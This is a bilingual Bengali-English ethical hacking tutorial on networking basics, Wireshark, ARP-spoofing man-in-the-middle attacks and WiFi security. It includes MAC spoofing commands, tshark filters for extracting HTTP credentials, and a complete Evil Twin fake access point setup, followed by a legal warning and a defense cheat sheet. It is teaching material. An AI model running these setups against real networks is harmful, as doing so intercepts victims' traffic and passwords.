CHAPTER 01 — NETWORKING BASICS
🌐 Networking
নেটওয়ার্ক পরিচিতি — OSI Model ও TCP/IPNetwork Introduction — OSI Model & TCP/IP
কম্পিউটার কিভাবে কথা বলে — একদম শুরু থেকে বোঝোHow computers talk to each other — understanding from scratch

🤔 নেটওয়ার্ক কী?What is a Network?

নেটওয়ার্ক হলো দুই বা তার বেশি কম্পিউটারের সংযোগ যারা তথ্য আদান-প্রদান করতে পারে। Network Hacking বুঝতে হলে আগে জানতে হবে নেটওয়ার্ক আসলে কিভাবে কাজ করে।A network is a connection of two or more computers that can exchange information. To understand Network Hacking, you first need to know how networks actually work.

📮 সহজ উপমাSimple Analogy

নেটওয়ার্ক হলো একটা ডাক ব্যবস্থার মতো। তুমি চিঠি লিখো (data), খামে ভরো (packet), ঠিকানা লাগাও (IP address), পোস্ট অফিসে দাও (router) এবং চিঠি গন্তব্যে পৌঁছায়। Hacker হলো সেই ব্যক্তি যে মাঝপথে চিঠি ধরে পড়ে বা বদলে দেয়।A network is like a postal system. You write a letter (data), put it in an envelope (packet), add an address (IP address), give it to the post office (router) and the letter reaches its destination. A hacker is the person who intercepts and reads or changes the letter midway.

🏗️ OSI Model — নেটওয়ার্কের ৭ তলা বিল্ডিংThe 7-Story Building of Networking

OSI Model হলো নেটওয়ার্ক যোগাযোগকে ৭টি স্তরে ভাগ করার একটি কাঠামো। প্রতিটি স্তরের আলাদা কাজ আছে।The OSI Model is a framework that divides network communication into 7 layers. Each layer has its own specific job.

OSI Model                       Attack Examples
┌─────────────────────────────────────────────────┐
│  Layer 7 │ Application  │ HTTP, DNS, FTP    │ ← XSS, SQLi     │
│  Layer 6 │ Presentation │ SSL/TLS, Encoding │ ← SSL Strip     │
│  Layer 5 │ Session      │ Sessions, Auth    │ ← Session Hijack│
│  Layer 4 │ Transport    │ TCP, UDP, Ports   │ ← Port Scan     │
│  Layer 3 │ Network      │ IP, Routing       │ ← IP Spoofing   │
│  Layer 2 │ Data Link    │ MAC, ARP, Switch  │ ← ARP Spoofing  │
│  Layer 1 │ Physical     │ Cable, WiFi, Hub  │ ← Sniffing      │
└─────────────────────────────────────────────────┘
Network Hacking মূলত Layer 2, 3, 4 তে হয়

🤝 TCP 3-Way Handshake

TCP connection তৈরি হওয়ার আগে তিনটি ধাপে "হ্যান্ডশেক" হয়। এটা Hacker-এর জন্য গুরুত্বপূর্ণ কারণ এই process-এই অনেক attack হয়।Before a TCP connection is established, a three-step "handshake" occurs. This is important for hackers because many attacks happen during this process.

Client                              Server

  │──── SYN (আমি connect করতে চাই) ────→│
  │←─── SYN-ACK (ঠিক আছে, রেডি) ───────│
  │──── ACK (পেয়েছি, চালু করো) ─────────→│
  │                                       │
  │════ DATA TRANSFER শুরু ════════════════│

Port Scan: SYN পাঠাই, SYN-ACK পেলে port open!
SYN Flood: লক্ষ লক্ষ SYN পাঠিয়ে server overwhelm

📌 সারসংক্ষেপSummary

  • 🌐 OSI Model = ৭ layer — প্রতিটিতে আলাদা attack সম্ভবOSI Model = 7 layers — different attacks at each layer
  • 🔄 TCP/IP = বাস্তবে ব্যবহৃত protocol stackTCP/IP = actually used protocol stack
  • 🤝 3-Way Handshake = SYN → SYN-ACK → ACK
  • 🎯 Network Hacking মূলত Layer 2-4-এ হয়Network Hacking mainly happens at Layers 2-4

📍 IP Address — নেটওয়ার্কের ঠিকানাThe Network Address

IPv4 — ৩২ bit

  • Format: 192.168.1.100
  • Private: 192.168.x.x, 10.x.x.x
  • Public: বাইরের ইন্টারনেটে
  • Loopback: 127.0.0.1 (নিজের)

দরকারি CommandsUseful Commands

# নিজের IP দেখো ip addr show # Linux ifconfig # Linux/Mac ipconfig # Windows # Public IP দেখো curl ifconfig.me # Network scan nmap -sn 192.168.1.0/24

🪪 MAC Address — Hardware পরিচয়Hardware Identity

MAC (Media Access Control) Address হলো Network Interface Card-এর স্থায়ী পরিচয়। এটা ৪৮-bit এবং manufacturer নির্ধারণ করে। ARP Spoofing attack এই MAC address নিয়েই খেলে।A MAC Address is the permanent identity of a Network Interface Card. It's 48-bit and determined by the manufacturer. ARP Spoofing attacks play with this MAC address.

# MAC format: AA:BB:CC:DD:EE:FF # প্রথম 3 byte = OUI (manufacturer) # শেষ 3 byte = Device-specific # MAC দেখো $ ip link show $ ifconfig -a # ARP Table দেখো (IP → MAC mapping) $ arp -a $ ip neigh show # MAC Spoofing (পরিচয় বদলানো) $ sudo ip link set dev eth0 down $ sudo ip link set dev eth0 address AA:BB:CC:DD:EE:FF $ sudo ip link set dev eth0 up

🦈 Wireshark কী?What is Wireshark?

Wireshark হলো world-এর সবচেয়ে জনপ্রিয় Network Protocol Analyzer। এটা দিয়ে নেটওয়ার্কে চলমান সব packet দেখা, ধরা ও বিশ্লেষণ করা যায়। Ethical Hacker এবং Network Admin — উভয়ের কাছেই অপরিহার্য।Wireshark is the world's most popular Network Protocol Analyzer. It can view, capture and analyze all packets on the network. Indispensable for both Ethical Hackers and Network Admins.

🔭 সহজ উপমাSimple Analogy

Wireshark হলো একটা X-Ray মেশিনের মতো যা নেটওয়ার্কের ভেতর দিয়ে যাওয়া প্রতিটা packet-এর ভেতরে তাকায়। কে কার সাথে কথা বলছে, কী পাঠাচ্ছে — সব দেখা যায়।Wireshark is like an X-Ray machine that looks inside every packet passing through the network. Who is talking to whom, what they're sending — everything is visible.

🎯 Capture শুরু করাStarting a Capture

# Interface select করো তারপর Capture শুরু # GUI: Interface → Double click → Capture শুরু # tshark দিয়ে command line capture $ sudo tshark -i eth0 # eth0 interface $ sudo tshark -i wlan0 # WiFi interface $ sudo tshark -i any # সব interface # File-এ save করো $ sudo tshark -i eth0 -w capture.pcap # নির্দিষ্ট packet count $ sudo tshark -i eth0 -c 100 -w out.pcap # pcap file open করো $ wireshark capture.pcap

🔍 Display Filters — প্রয়োজনীয়টা খোঁজোFinding What You Need

## IP Filters ## ip.addr == 192.168.1.5 # নির্দিষ্ট IP ip.src == 192.168.1.5 # Source IP ip.dst == 8.8.8.8 # Destination IP ip.addr == 192.168.1.0/24 # Subnet ## Protocol Filters ## http # শুধু HTTP dns # শুধু DNS tcp # শুধু TCP udp # শুধু UDP arp # শুধু ARP icmp # Ping/ICMP ssl || tls # HTTPS traffic ## Port Filters ## tcp.port == 80 # HTTP port tcp.port == 443 # HTTPS tcp.dstport == 22 # SSH destination tcp.port in {80 443 8080} # Multiple ports ## Content Filters ## http.request.method == "POST" # POST requests http.host contains "google" # Google traffic dns.qry.name contains "facebook"# Facebook DNS frame contains "password" # "password" ধারণকারী packet ## Combine Filters ## ip.src == 192.168.1.5 && http # AND dns || arp # OR !icmp # NOT (ping ছাড়া সব)

🎣 Capture Filters — ধরার আগেই ছাঁকোFilter Before Capturing

# Capture শুরুর আগে filter দাও (BPF syntax) $ sudo tshark -i eth0 -f "host 192.168.1.1" $ sudo tshark -i eth0 -f "port 80" $ sudo tshark -i eth0 -f "tcp and port 443" $ sudo tshark -i eth0 -f "not broadcast and not multicast" # HTTP credentials খোঁজো $ sudo tshark -i eth0 -Y "http.request.method == POST" \ -T fields -e http.host -e http.request.uri \ -e http.file_data

🔎 Follow Stream — পুরো conversation দেখোFollow Stream — See Full Conversation

💡 Follow TCP/HTTP Stream
Wireshark-এ যেকোনো HTTP packet-এ Right Click → Follow → TCP Stream করলে পুরো HTTP conversation একসাথে দেখা যায়। এখানে plain text-এ username, password, cookies সব দেখা যেতে পারে। Right-click on any HTTP packet in Wireshark → Follow → TCP Stream to see the full HTTP conversation. Plain text usernames, passwords and cookies may all be visible here.

📛 DNS Traffic Analysis

# DNS queries দেখো — কোন website visit হচ্ছে $ tshark -r capture.pcap -Y "dns.flags.response == 0" \ -T fields -e dns.qry.name | sort | uniq -c | sort -rn

CHAPTER 06 — MAN-IN-THE-MIDDLE
🕵️ MitM
Man-in-the-Middle Attack — কিভাবে কাজ করেHow It Works
দুজনের মাঝখানে গোপনে বসে সব দেখা ও বদলানোSecretly sitting between two parties to see and alter everything

🕵️ MitM কী?What is MitM?

Man-in-the-Middle Attack হলো এমন একটি আক্রমণ যেখানে attacker দুটি পক্ষের মধ্যে গোপনে অবস্থান করে এবং তাদের যোগাযোগ intercept, monitor বা modify করে। উভয় পক্ষই মনে করে তারা সরাসরি কথা বলছে।A Man-in-the-Middle Attack is an attack where the attacker secretly positions themselves between two parties and intercepts, monitors or modifies their communication. Both parties believe they are communicating directly.

📬 সহজ উপমাSimple Analogy

🔗 ARP কিভাবে কাজ করে?

ARP (Address Resolution Protocol) IP address-কে MAC address-এ রূপান্তর করে। কম্পিউটার জানতে চাইলে broadcast পাঠায়: "কার IP এটা?"। সেই IP-র মালিক respond করে তার MAC দিয়ে। সমস্যা হলো ARP stateless — যে কেউ যেকোনো সময় যেকোনো ARP reply পাঠাতে পারে!ARP (Address Resolution Protocol) converts IP addresses to MAC addresses. When a computer wants to know, it broadcasts: "Who has this IP?" The owner of that IP responds with their MAC. The problem is ARP is stateless — anyone can send any ARP reply at any time!

Normal ARP:
Alice: "Gateway (192.168.1.1) কার?" → Broadcast
Router: "আমার! MAC = AA:BB:CC:DD:EE:FF"
Alice ARP Table: 192.168.1.1 → AA:BB:CC:DD:EE:FF

ARP Spoofing:
Attacker পাঠায় (যাচাই ছাড়াই accept হয়!):
→ Alice কে: "192.168.1.1 (Router) এর MAC = আমার MAC"
→ Router কে: "192.168.1.5 (Alice) এর MAC = আমার MAC"

এখন:
Alice ARP Table: 192.168.1.1 → Attacker MAC ← বিষ!
Router ARP Table: 192.168.1.5 → Attacker MAC ← বিষ!

Alice → Attacker → Router (MitM সফল)

📶 WiFi কিভাবে কাজ করে?How Does WiFi Work?

WiFi হলো radio wave-এর মাধ্যমে wireless নেটওয়ার্ক। Access Point (Router) broadcast করে SSID (নেটওয়ার্কের নাম)। Client connect হতে চাইলে authentication হয়। এই authentication process-এই বেশিরভাগ WiFi attack হয়।WiFi is a wireless network using radio waves. The Access Point (Router) broadcasts the SSID (network name). When a client wants to connect, authentication happens. Most WiFi attacks occur during this authentication process.

🔐 WiFi Security Standards

❌ WEP (1997) — সম্পূর্ণ ভাঙা

  • RC4 cipher — দুর্বল
  • কয়েক মিনিটে crack করা যায়
  • কখনো ব্যবহার করো না
  • 24-bit IV — পুনরায় ব্যবহার হয়

⚠️ WPA (2003) — দুর্বল

  • TKIP — WEP-এর উন্নতি
  • Dictionary attack সম্ভব
  • এড়িয়ে চলা উচিত

⚠️ WPA2 (2004) — সবচেয়ে বেশি ব্যবহৃত

  • AES-CCMP encryption
  • 4-way handshake capture → crack
  • দুর্বল password হলে crack সম্ভব
  • PMKID attack সম্ভব

✅ WPA3 (2018) — সবচেয়ে নিরাপদ

  • SAE (Dragonfly) handshake
  • Dictionary attack প্রতিরোধী
  • Forward Secrecy
  • 192-bit security

🤝 4-Way Handshake কী?

WPA2-তে client connect হওয়ার সময় 4টি message exchange হয় যাকে 4-Way Handshake বলে। এই handshake-এ password hash থাকে। আমরা এই handshake capture করে offline-এ crack করতে পারি।When a client connects in WPA2, 4 messages are exchanged called the 4-Way Handshake. This handshake contains the password hash. We can capture this handshake and crack it offline.

4-Way Handshake:
Client                          AP (Router)
  │←────── ANonce ─────────────────│  Message 1
  │─────── SNonce + MIC ──────────→│  Message 2
  │←────── GTK + MIC ──────────────│  Message 3
  │─────── ACK ───────────────────→│  Message 4

Handshake capture করলে offline dictionary attack সম্ভব
কিন্তু: শুধু dictionary-তে থাকলেই crack হবে!

আসলটার মতো দেখতে ভুয়া WiFi Hotspot তৈরি করে victim ধরাTrapping victims with a fake WiFi Hotspot that looks like the real one

👥 Evil Twin কী?

Evil Twin হলো একটি ভুয়া WiFi Access Point যা আসল AP-র মতো একই SSID (নাম) ব্যবহার করে। Victim ভুল করে বা stronger signal-এ এই ভুয়া AP-তে connect হয় এবং সব traffic attacker-এর মধ্য দিয়ে যায়।Evil Twin is a fake WiFi Access Point that uses the same SSID (name) as the real AP. The victim accidentally or due to stronger signal connects to this fake AP and all their traffic passes through the attacker.

Real AP:  "CafeWiFi" (BSSID: AA:BB:CC, Signal: -60dBm)
Evil Twin: "CafeWiFi" (BSSID: 11:22:33, Signal: -30dBm stronger!)

Victim phone automatically stronger signal-এ connect হয়
          ↓
Evil Twin → Attacker → Real Internet
Victim জানে না সব traffic দেখা যাচ্ছে

⚙️ Evil Twin Setup

# hostapd দিয়ে Fake AP তৈরি $ sudo apt install hostapd dnsmasq -y # hostapd.conf তৈরি করো $ cat > /tmp/hostapd.conf << EOF interface=wlan0 driver=nl80211 ssid=CafeWiFi hw_mode=g channel=6 EOF # দ্বিতীয় adapter-এ internet connection দাও # dnsmasq.conf — DHCP server $ cat > /tmp/dnsmasq.conf << EOF interface=wlan0 dhcp-range=192.168.99.2,192.168.99.254,12h dhcp-option=3,192.168.99.1 dhcp-option=6,192.168.99.1 EOF # IP setup করো $ sudo ip addr add 192.168.99.1/24 dev wlan0 $ sudo ip link set wlan0 up # hostapd ও dnsmasq চালাও $ sudo hostapd /tmp/hostapd.conf & $ sudo dnsmasq -C /tmp/dnsmasq.conf # NAT — internet forward করো $ sudo iptables -t nat -A POSTROUTING \ -o eth0 -j MASQUERADE

⛔ সতর্কতাWarning
Evil Twin Attack অনুমতি ছাড়া যেকোনো নেটওয়ার্কে পরিচালনা করা গুরুতর অপরাধ। শুধু নিজের পরিবেশে (Home Lab) অনুশীলন করো। Running an Evil Twin Attack on any network without permission is a serious crime. Only practice in your own environment (Home Lab).

🛡️ Network Attack Defense Cheat Sheet

🔒 ARP Spoofing থেকে রক্ষা

  • Dynamic ARP Inspection (DAI) — managed switch-এ
  • Static ARP entries — critical server-এর জন্য
  • arpwatch দিয়ে monitor করো
  • VPN ব্যবহার করো — traffic encrypted থাকে
  • XArp tool দিয়ে detect করো

🔒 DNS Spoofing থেকে রক্ষা

  • DNSSEC enable করো
  • DoH (DNS over HTTPS) ব্যবহার করো
  • 1.1.1.1 বা 8.8.8.8 use করো
  • Pi-hole + DNSSEC home-এ
  • HTTPS সবসময় চেক করো

🔒 WiFi Attack থেকে রক্ষা

  • WPA3 ব্যবহার করো
  • 15+ character strong password
  • Public WiFi-তে VPN অবশ্যই
  • Auto-connect WiFi বন্ধ রাখো
  • Unknown network-এ connect করো না

🔒 General Network Security

  • সবসময় HTTPS ব্যবহার করো
  • HSTS Preload enable করো
  • Network traffic monitor করো
  • Firewall properly configure করো
  • Unnecessary port বন্ধ রাখো
